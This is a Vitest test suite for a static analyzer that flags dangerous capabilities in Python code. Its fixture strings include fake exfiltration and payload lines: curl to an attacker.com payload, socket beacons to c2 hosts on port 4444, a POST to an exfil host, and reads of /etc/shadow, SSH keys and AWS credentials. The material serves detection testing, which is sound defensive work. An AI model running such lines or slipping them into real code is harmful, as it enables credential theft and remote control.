import { describe, expect, it, beforeAll } from 'vitest';
import { AstCapabilityAnalyzer } from '../src/capabilities/ast-capability-analyzer.js';
import { TreeSitterLoader } from '../src/parsers/tree-sitter-loader.js';
import { PythonCapabilityExtractor } from '../src/capabilities/python-capability-extractor.js';

describe('PythonCapabilityExtractor — Full AST Capability Suite (Phase 3)', () => {
  beforeAll(async () => {
    await TreeSitterLoader.init();
  });

  it('detects os.environ and os.getenv access with HIGH confidence', async () => {
    const code = `
import os

def load_credentials():
    api_key = os.environ["AWS_SECRET_ACCESS_KEY"]
    token = os.getenv("GITHUB_TOKEN", "default_val")
    return api_key, token
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/auth.py');
    expect(result.capabilities.hasEnvAccess).toBe(true);
    expect(result.capabilities.hasShell).toBe(false);

    const envSites = result.sites.filter((s) => s.capability === 'env');
    expect(envSites.length).toBeGreaterThanOrEqual(2);
    for (const site of envSites) {
      expect(site.confidence).toBe('HIGH');
      expect(site.enclosingFunction).toBe('load_credentials');
    }
  });

  it('resolves shell execution across aliases and destructured imports', async () => {
    const code = `
import subprocess as sp
from os import system as sys_exec

def run_payload():
    sp.run(["curl", "http://attacker.com/payload.sh"], shell=True)
    sys_exec("id > /tmp/whoami")
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/executor.py');
    expect(result.capabilities.hasShell).toBe(true);

    const shellSites = result.sites.filter((s) => s.capability === 'shell');
    expect(shellSites.length).toBe(2);
    expect(shellSites[0]?.snippet).toContain('sp.run');
    expect(shellSites[1]?.snippet).toContain('sys_exec');
    expect(shellSites[0]?.confidence).toBe('HIGH');
  });

  it('detects outbound network requests from requests, urllib, and socket', async () => {
    const code = `
import requests
import socket
from urllib.request import urlopen

def exfiltrate_data(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("c2.darknet.org", 4444))
    requests.post("https://api.exfil.com/leak", json=data)
    urlopen("http://ping.server.com/beacon")
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/network_sync.py');
    expect(result.capabilities.hasNetwork).toBe(true);

    const netSites = result.sites.filter((s) => s.capability === 'network');
    expect(netSites.length).toBeGreaterThanOrEqual(3);
    for (const site of netSites) {
      expect(site.confidence).toBe('HIGH');
    }
  });

  it('detects sensitive filesystem targets and marks dynamic paths with LOW confidence', async () => {
    const code = `
import os
from pathlib import Path

def inspect_system(user_path):
    # High confidence sensitive targets
    with open("/etc/passwd", "r") as f:
        content = f.read()
    
    ssh_key = open(os.path.join(os.path.expanduser("~"), ".ssh", "id_rsa")).read()
    env_file = open(".env", "r").read()

    # Dynamic path argument
    with open(user_path, "r") as custom_file:
        custom_content = custom_file.read()
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/files.py');
    expect(result.capabilities.hasFsSensitive).toBe(true);

    const highSites = result.sites.filter(
      (s) => s.capability === 'fsSensitive' && s.confidence === 'HIGH'
    );
    const lowSites = result.sites.filter(
      (s) => s.capability === 'fsSensitive' && s.confidence === 'LOW'
    );

    expect(highSites.length).toBeGreaterThanOrEqual(2);
    expect(lowSites.length).toBeGreaterThanOrEqual(1);
  });

  it('detects eval, exec, compile and dynamic importlib reflection', async () => {
    const code = `
import importlib

def evaluate_dynamic(raw_code, mod_name):
    eval(raw_code)
    exec("import os; os.system('calc.exe')")
    mod = importlib.import_module(mod_name)
    return mod
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/dynamic.py');
    expect(result.capabilities.hasEval).toBe(true);
    expect(result.capabilities.hasDynamicRequire).toBe(true);

    const evalSites = result.sites.filter((s) => s.capability === 'eval');
    const dynSites = result.sites.filter((s) => s.capability === 'dynamicRequire');

    expect(evalSites.length).toBe(2);
    expect(dynSites.length).toBe(1);
    expect(dynSites[0]?.snippet).toContain('importlib.import_module');
  });

  it('detects low-level debug introspection hooks (sys.settrace, ctypes)', async () => {
    const code = `
import sys
import ctypes

def anti_debug():
    sys.settrace(None)
    frame = sys._getframe(1)
    lib = ctypes.CDLL("libc.so.6")
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/defense.py');
    expect(result.capabilities.hasDebugInternals).toBe(true);

    const debugSites = result.sites.filter((s) => s.capability === 'debugInternals');
    expect(debugSites.length).toBeGreaterThanOrEqual(2);
  });

  it('seamlessly parses modern Python 3.12 syntax without crashing or dropping capabilities', async () => {
    const code = `
import os
import subprocess

# Python 3.12 PEP 695 type statement
type Point[T] = tuple[T, T]

# Python 3.10 match/case
def dispatch(cmd: str):
    match cmd:
        case "exec":
            subprocess.run(["echo", "hello"])
        case "env":
            return os.environ.get("MODE")
        case _:
            pass
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/modern312.py');
    expect(result.capabilities.hasShell).toBe(true);
    expect(result.capabilities.hasEnvAccess).toBe(true);
    expect(result.hasSyntaxError).toBe(false);
  });

  it('handles pathlib file reading, binary string concatenation, and dotenv loading', async () => {
    const code = `
import dotenv
from pathlib import Path
import io

dotenv.load_dotenv()
config = io.open("~" + "/.aws/credentials", "r").read()
path_obj = Path("/etc/shadow")
shadow_data = path_obj.read_text()
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/more_capabilities.py');
    expect(result.capabilities.hasEnvAccess).toBe(true);
    expect(result.capabilities.hasFsSensitive).toBe(true);

    const fsSites = result.sites.filter((s) => s.capability === 'fsSensitive');
    expect(fsSites.length).toBeGreaterThanOrEqual(2);
    expect(fsSites.some((s) => s.details?.includes('.aws/credentials'))).toBe(true);
    expect(fsSites.some((s) => s.details?.includes('pathlib'))).toBe(true);
  });

  it('detects builtins.eval, __import__, and syntax errors gracefully', async () => {
    const code = `
import builtins

def dynamic_calls():
    builtins.eval("1 + 1")
    compile("2 + 2", "<string>", "eval")
    mod = __import__("secret_module")

# Syntax error in following line
def broken(
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/syntax_err.py');
    expect(result.hasSyntaxError).toBe(true);
    expect(result.capabilities.hasEval).toBe(true);
    expect(result.capabilities.hasDynamicRequire).toBe(true);

    const evalSites = result.sites.filter((s) => s.capability === 'eval');
    expect(evalSites.length).toBeGreaterThanOrEqual(2);
    const dynSites = result.sites.filter((s) => s.capability === 'dynamicRequire');
    expect(dynSites.length).toBeGreaterThanOrEqual(1);
  });

  it('handles aliased environ subscript and getenv calls', async () => {
    const code = `
from os import environ as env_map, getenv as fetch_env

def read_custom():
    val = env_map['SECRET_KEY']
    port = fetch_env('PORT')
    return val, port
`;

    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/aliased_env.py');
    expect(result.capabilities.hasEnvAccess).toBe(true);
    const envSites = result.sites.filter((s) => s.capability === 'env');
    expect(envSites.length).toBeGreaterThanOrEqual(2);
  });

  it('directly validates PythonCapabilityExtractor helper methods and AST extraction', () => {
    expect(PythonCapabilityExtractor.unquote('"test"')).toBe('test');
    expect(PythonCapabilityExtractor.unquote("r'raw_path'")).toBe('raw_path');
    expect(PythonCapabilityExtractor.unquote('"""triple"""')).toBe('triple');

    const parseRes = TreeSitterLoader.parseFile('import os\nos.system("ls")', 'python');
    const directAnalysis = PythonCapabilityExtractor.extract(
      parseRes.tree!.rootNode,
      'import os\nos.system("ls")',
      'test.py',
      false
    );
    expect(directAnalysis.capabilities.hasShell).toBe(true);
    expect(directAnalysis.sites.length).toBe(1);
    parseRes.tree!.delete();
  });

  it('directly invokes AstCapabilityAnalyzer.extractPythonCapabilities per Strategy specification', async () => {
    const code = `
import subprocess
runner = subprocess.run
eval_fn = eval

def execute_reassigned():
    runner(["whoami"])
    eval_fn("1 + 1")
`;
    const res = await AstCapabilityAnalyzer.extractPythonCapabilities(code, 'src/reassigned.py');
    expect(res.capabilities.hasShell).toBe(true);
    expect(res.capabilities.hasEval).toBe(true);
    expect(res.sites.length).toBe(2);

    const shellSite = res.sites.find((s) => s.capability === 'shell');
    expect(shellSite?.confidence).toBe('HIGH');
    expect(shellSite?.snippet).toContain('runner');

    const evalSite = res.sites.find((s) => s.capability === 'eval');
    expect(evalSite?.confidence).toBe('HIGH');
    expect(evalSite?.snippet).toContain('eval_fn');
  });

  it('correctly analyzes .pyw Windows Python scripts (not fallback token scan)', async () => {
    const code = `
import socket
import os

def stealth_beacon():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("c2.attacker.com", 4444))
    os.system("whoami > C:\\\\Windows\\\\Temp\\\\beacon.txt")
`;
    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/backdoor.pyw');
    expect(result.capabilities.hasShell).toBe(true);
    expect(result.capabilities.hasNetwork).toBe(true);

    const shellSite = result.sites.find((s) => s.capability === 'shell');
    expect(shellSite).toBeDefined();
    expect(shellSite?.confidence).toBe('HIGH');
    expect(shellSite?.snippet).toContain('os.system');

    const netSite = result.sites.find((s) => s.capability === 'network');
    expect(netSite).toBeDefined();
    expect(netSite?.confidence).toBe('HIGH');
    expect(result.hasSyntaxError).toBe(false);
  });

  it('gracefully handles syntax-error Python via fallback token scan', async () => {
    const brokenCode = `
# Syntax error Python script with unclosed paren and invalid tokens
def broken_syntax((([
import os
os.system("whoami")
`;
    const result = await AstCapabilityAnalyzer.analyzeFile(brokenCode, 'src/malformed.py');
    expect(result).toBeDefined();
    expect(Array.isArray(result.sites)).toBe(true);
    expect(result.capabilities.hasShell).toBe(true);

    const fallbackDirect = AstCapabilityAnalyzer.fallbackTokenScan(
      brokenCode,
      'src/malformed.py',
      true
    );
    expect(fallbackDirect).toBeDefined();
    expect(Array.isArray(fallbackDirect.sites)).toBe(true);
    expect(fallbackDirect.capabilities.hasShell).toBe(true);
    expect(fallbackDirect.sites.some((s) => s.capability === 'shell')).toBe(true);
  });
});
